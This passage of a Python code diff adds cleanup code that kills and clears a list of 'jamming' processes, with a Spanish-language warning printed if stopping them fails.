+                        try:
+                            process.kill()
+                            process.wait(timeout=1)
+                        except:
+                            pass
+                self.jam_processes = []
+        
         except Exception as e:
             print(f"Advertencia al detener jamming: {e}")
     
